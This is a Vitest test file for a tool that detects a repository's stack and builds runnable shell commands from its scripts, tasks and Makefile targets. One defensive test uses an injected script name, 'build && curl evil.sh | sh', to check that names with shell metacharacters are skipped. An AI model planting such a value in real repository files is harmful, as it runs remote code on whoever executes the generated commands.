import { describe, expect, it } from 'vitest';
import { detectPackageManager, detectProject, justRecipes, makeTargets, type DirectoryScan } from '../../src/core/detect';

const scan = (dir: string, files: Record<string, string | null>): DirectoryScan => ({
  dir,
  files: Object.keys(files),
  read: Object.fromEntries(Object.entries(files).filter(([, v]) => v !== null)) as Record<string, string>,
});

const pkg = (obj: object) => JSON.stringify(obj);

describe('package manager detection', () => {
  it('uses the packageManager field first, then lockfiles, then npm', () => {
    expect(detectPackageManager(scan('', { 'yarn.lock': null }), { packageManager: 'pnpm@9.0.0' })).toBe('pnpm');
    expect(detectPackageManager(scan('', { 'bun.lock': null }))).toBe('bun');
    expect(detectPackageManager(scan('', { 'yarn.lock': null }))).toBe('yarn');
    expect(detectPackageManager(scan('', {}))).toBe('npm');
  });
  it('falls back to the root lockfile for workspace packages', () => {
    expect(detectPackageManager(scan('apps/web', {}), {}, scan('', { 'pnpm-lock.yaml': null }))).toBe('pnpm');
  });
});

describe('detectProject', () => {
  const result = detectProject([
    scan('', {
      'package.json': pkg({
        scripts: { dev: 'next dev', test: 'vitest', pretest: 'echo hi', lint: 'eslint .' },
        dependencies: { next: '15', react: '19' },
        devDependencies: { typescript: '5', vitest: '3', prisma: '6', eslint: '9' },
      }),
      'pnpm-lock.yaml': null,
      Dockerfile: null,
      'compose.yaml': null,
      Makefile: '.PHONY: all\nall: build\nbuild:\n\tgo build\n%.o: %.c\nVAR := 1\n',
    }),
    scan('services/api', {
      'go.mod': 'module x',
      'pyproject.toml': '[project]\ndependencies = ["fastapi", "pytest"]\n[tool.ruff]\n',
      'uv.lock': null,
    }),
  ]);
  const names = result.commands.map((c) => c.name);

  it('detects technologies', () => {
    for (const tech of [
      'pnpm',
      'Next.js',
      'TypeScript',
      'Vitest',
      'Prisma',
      'ESLint',
      'React',
      'Docker',
      'Docker Compose',
      'Make',
      'Go',
      'Python',
      'uv',
      'pytest',
      'Ruff',
      'FastAPI',
    ]) {
      expect(result.techs).toContain(tech);
    }
  });

  it('creates package.json script commands with the right package manager, skipping pre/post hooks', () => {
    const dev = result.commands.find((c) => c.name === 'dev')!;
    expect(dev.command).toBe('pnpm run dev ${args}');
    expect(dev.args).toBe('extra arguments (optional)');
    expect(dev.group).toBe('scripts');
    expect(names).not.toContain('pretest');
  });

  it('creates package manager and tool commands', () => {
    expect(result.commands.find((c) => c.name === 'pnpm-add')!.command).toBe('pnpm add ${args}');
    expect(result.commands.find((c) => c.name === 'vitest-file')!.command).toBe('pnpm exec vitest run ${q:file}');
    expect(result.commands.find((c) => c.name === 'prisma-migrate')!.args).toBe('migration name');
  });

  it('parses Makefile targets', () => {
    expect(names).toContain('make-all');
    expect(names).toContain('make-build');
    expect(names.some((n) => n.includes('PHONY') || n.includes('%') || n === 'make-VAR')).toBe(false);
  });

  it('prefixes sub-folder commands and runs them in that folder', () => {
    const goTest = result.commands.find((c) => c.name === 'api:go-test')!;
    expect(goTest.cwd).toBe('services/api');
    expect(result.commands.find((c) => c.name === 'api:pytest')!.command).toBe('uv run pytest');
  });

  it('produces unique ids', () => {
    const ids = result.commands.map((c) => c.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('ignores invalid package.json', () => {
    expect(detectProject([scan('', { 'package.json': '{oops' })]).commands).toEqual([]);
  });
});

describe('recipes', () => {
  it('parses make targets and just recipes', () => {
    expect(makeTargets('a: b\n.PHONY: a\nb:\nc ::= x\n')).toEqual(['a', 'b']);
    expect(justRecipes('set shell := ["bash"]\nbuild:\n  cargo build\ntest arg="x":\n  echo\n@quiet:\n')).toEqual([
      'build',
      'test',
      'quiet',
    ]);
  });
});

// Script and task names come from files in a cloned repo and are pasted into shell commands.
describe('untrusted script names', () => {
  const evil = 'build && curl evil.sh | sh';
  const commands = (files: Record<string, string>) => detectProject([scan('', files)]).commands.map((i) => i.command);

  it.each([
    ['package.json scripts', { 'package.json': pkg({ scripts: { [evil]: 'tsc', 'build:prod': 'tsc' } }) }, 'npm run build:prod -- ${args}'],
    ['deno tasks', { 'deno.json': pkg({ tasks: { [evil]: 'x', 'dev:watch': 'x' } }) }, 'deno task dev:watch'],
    ['composer scripts', { 'composer.json': pkg({ scripts: { [evil]: 'x', '@scope/test': 'x' } }) }, 'composer run-script @scope/test'],
  ])('skips shell metacharacters in %s but keeps normal names', (_label, files, safe) => {
    const all = commands(files);
    expect(all).toContain(safe);
    expect(all.filter((c) => c.includes('curl'))).toEqual([]);
  });
});

describe('deno tasks', () => {
  it('reads Deno 2 object tasks as well as string tasks', () => {
    const tasks = {
      build: 'deno run -A build.ts',
      dev: { command: 'deno run -A dev.ts', description: 'Start the dev server' },
      lint: { command: 'deno lint' },
    };
    const items = detectProject([scan('', { 'deno.json': pkg({ tasks }) })]).commands;
    const description = (task: string) => items.find((i) => i.command === `deno task ${task}`)?.description;
    expect(description('build')).toBe('deno run -A build.ts');
    expect(description('dev')).toBe('Start the dev server');
    expect(description('lint')).toBe('deno lint');
  });
});

describe('more stacks', () => {
  const commands = (...scans: DirectoryScan[]) => Object.fromEntries(detectProject(scans).commands.map((c) => [c.name, c.command]));
  const withDirs = (s: DirectoryScan, dirs: string[]): DirectoryScan => ({ ...s, dirs });
  const flutterPubspec = 'name: app\ndependencies:\n  flutter:\n    sdk: flutter\ndev_dependencies:\n  build_runner: ^2.4.0\n';

  it('covers the daily Flutter loop', () => {
    const c = commands(scan('', { 'pubspec.yaml': flutterPubspec, 'l10n.yaml': null }));
    expect(c['flutter-run']).toBe('flutter run ${args}');
    expect(c['flutter-build']).toBe('flutter build ${args}');
    expect(c['flutter-clean']).toBe('flutter clean');
    expect(c['flutter-devices']).toBe('flutter devices');
    expect(c['flutter-analyze']).toBe('flutter analyze');
    expect(c['flutter-format']).toBe('dart format .');
    expect(c['flutter-fix']).toBe('dart fix --apply');
    expect(c['flutter-upgrade']).toBe('flutter pub upgrade');
    expect(c['flutter-outdated']).toBe('flutter pub outdated');
    expect(c['build-runner']).toBe('dart run build_runner build --delete-conflicting-outputs');
    expect(c['build-runner-watch']).toBe('dart run build_runner watch --delete-conflicting-outputs');
    expect(c['flutter-l10n']).toBe('flutter gen-l10n');
  });

  it('runs Flutter through FVM when the project pins a version', () => {
    expect(commands(scan('', { 'pubspec.yaml': flutterPubspec, '.fvmrc': null }))['flutter-run']).toBe('fvm flutter run ${args}');
    const c = commands(withDirs(scan('', { 'pubspec.yaml': flutterPubspec }), ['.fvm']));
    expect(c['build-runner']).toBe('fvm dart run build_runner build --delete-conflicting-outputs');
  });

  it('keeps plain Dart packages on dart', () => {
    const c = commands(scan('', { 'pubspec.yaml': 'name: lib\n' }));
    expect(c['dart-test']).toBe('dart test');
    expect(c['dart-analyze']).toBe('dart analyze');
    expect(c['flutter-run']).toBeUndefined();
    expect(c['build-runner']).toBeUndefined();
  });

  it('offers Melos in Dart monorepos', () => {
    const c = commands(scan('', { 'pubspec.yaml': 'name: repo\n', 'melos.yaml': null }));
    expect(c['melos-bootstrap']).toBe('melos bootstrap');
    expect(c['melos-run']).toBe('melos run ${args}');
  });

  it('skips the native platform folders of Flutter and React Native apps', () => {
    const gradle = "plugins { id 'com.android.application' }";
    const flutter = commands(
      scan('', { 'pubspec.yaml': flutterPubspec }),
      scan('android', { 'build.gradle.kts': gradle, gradlew: null }),
      scan('android/app', { 'build.gradle.kts': gradle }),
      scan('windows', { 'CMakeLists.txt': null }),
    );
    expect(Object.keys(flutter).filter((n) => /gradle|cmake|ctest/.test(n))).toEqual([]);
    const rn = commands(
      scan('apps/mobile', { 'package.json': pkg({ dependencies: { 'react-native': '0.76.0' } }) }),
      scan('apps/mobile/android', { 'build.gradle': gradle }),
      scan('', {}),
    );
    expect(Object.keys(rn).filter((n) => n.includes('gradle'))).toEqual([]);
    // A plain Android project keeps its Gradle commands.
    expect(commands(scan('', { 'build.gradle': gradle }))['gradle-build']).toBe('gradle build');
  });

  it('detects Firebase, Supabase and Cloudflare Workers', () => {
    const c = commands(
      withDirs(scan('', { 'package.json': pkg({ devDependencies: { supabase: '^2' } }), 'firebase.json': null, 'wrangler.toml': null }), [
        'supabase',
      ]),
    );
    expect(c['firebase-emulators']).toBe('firebase emulators:start');
    expect(c['firebase-deploy']).toBe('firebase deploy ${args}');
    expect(c['supabase-start']).toBe('npx supabase start');
    expect(c['supabase-reset']).toBe('npx supabase db reset');
    expect(c['supabase-migration']).toBe('npx supabase migration new ${q:args}');
    expect(c['wrangler-dev']).toBe('npx wrangler dev');
    expect(c['wrangler-deploy']).toBe('npx wrangler deploy');
    // Without the npm package, the global Supabase CLI.
    expect(commands(withDirs(scan('', {}), ['supabase']))['supabase-start']).toBe('supabase start');
  });

  it('adds commands for frontend and Node tools that scripts rarely cover', () => {
    const c = commands(
      scan('', {
        'package.json': pkg({
          dependencies: { expo: '52', '@nestjs/core': '10' },
          devDependencies: { oxlint: '1', '@tauri-apps/cli': '2', '@nestjs/cli': '10' },
        }),
        'pnpm-lock.yaml': null,
        'eas.json': null,
      }),
    );
    expect(c['oxlint']).toBe('pnpm exec oxlint');
    expect(c['oxlint-fix']).toBe('pnpm exec oxlint --fix');
    expect(c['expo-ios']).toBe('pnpm exec expo run:ios');
    expect(c['expo-android']).toBe('pnpm exec expo run:android');
    expect(c['expo-prebuild']).toBe('pnpm exec expo prebuild');
    expect(c['eas-build']).toBe('eas build ${args}');
    expect(c['eas-update']).toBe('eas update ${args}');
    expect(c['tauri-dev']).toBe('pnpm exec tauri dev');
    expect(c['tauri-build']).toBe('pnpm exec tauri build');
    expect(c['nest-generate']).toBe('pnpm exec nest generate ${args}');
    expect(detectProject([scan('', { 'package.json': pkg({ dependencies: { '@nestjs/core': '10' } }) })]).techs).toContain('NestJS');
  });

  it('runs FastAPI, Flask and Alembic through the Python tool', () => {
    const c = commands(
      scan('', {
        'pyproject.toml': '[project]\ndependencies = ["fastapi[standard]", "flask", "alembic"]',
        'uv.lock': null,
        'alembic.ini': null,
      }),
    );
    expect(c['fastapi-dev']).toBe('uv run fastapi dev');
    expect(c['flask-run']).toBe('uv run flask run --debug');
    expect(c['alembic-upgrade']).toBe('uv run alembic upgrade head');
    expect(c['alembic-revision']).toBe('uv run alembic revision --autogenerate -m ${q:args}');
    expect(c['alembic-downgrade']).toBe('uv run alembic downgrade -1');
  });

  it('adds golangci-lint, Symfony and PHP test runners', () => {
    const go = commands(scan('', { 'go.mod': 'module x', '.golangci.yml': null }));
    expect(go['golangci-lint']).toBe('golangci-lint run');
    expect(go['golangci-fix']).toBe('golangci-lint run --fix');
    expect(commands(scan('', { 'go.mod': 'module x' }))['golangci-lint']).toBeUndefined();
    const php = commands(
      scan('', {
        'composer.json': pkg({
          require: { 'symfony/framework-bundle': '7' },
          'require-dev': { 'phpunit/phpunit': '11', 'pestphp/pest': '3' },
        }),
      }),
    );
    expect(php['symfony-console']).toBe('php bin/console ${args}');
    expect(php['symfony-cache-clear']).toBe('php bin/console cache:clear');
    expect(php['phpunit']).toBe('composer exec phpunit');
    expect(php['pest']).toBe('composer exec pest');
  });
});
